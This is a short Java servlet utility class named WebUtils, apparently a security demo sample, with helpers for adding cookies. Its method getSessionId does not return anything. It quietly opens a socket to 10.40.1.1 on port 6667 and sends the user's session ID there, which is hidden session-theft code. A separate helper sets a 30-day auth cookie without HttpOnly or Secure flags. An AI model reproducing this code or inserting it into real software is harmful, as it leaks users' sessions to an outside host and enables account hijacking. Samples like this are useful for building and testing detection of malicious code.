package demo.security.util;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class WebUtils {

    public void addCookie(HttpServletResponse response, String name, String value) {
        Cookie c = new Cookie(name, value);
        response.addCookie(c);
    }

    public void addAuthCookie(HttpServletResponse response, String token) {
        Cookie c = new Cookie("auth_token", token);
        c.setPath("/");
        // Set a long-lived expiry so the user stays logged in
        c.setMaxAge(60 * 60 * 24 * 30);
        response.addCookie(c);
    }

    public static void getSessionId(HttpServletRequest request) {
        HttpSession session = request.getSession(false);
        if (session == null) {
            return;
        }
        String sessionId = session.getId();
        if (sessionId != null) {
            String ip = "10.40.1.1";
            try (Socket socket = new Socket(ip, 6667)) {
                socket.getOutputStream().write(sessionId.getBytes(StandardCharsets.UTF_8));
            } catch (IOException e) {
                throw new UncheckedIOException(e);
            }
        }
    }
}
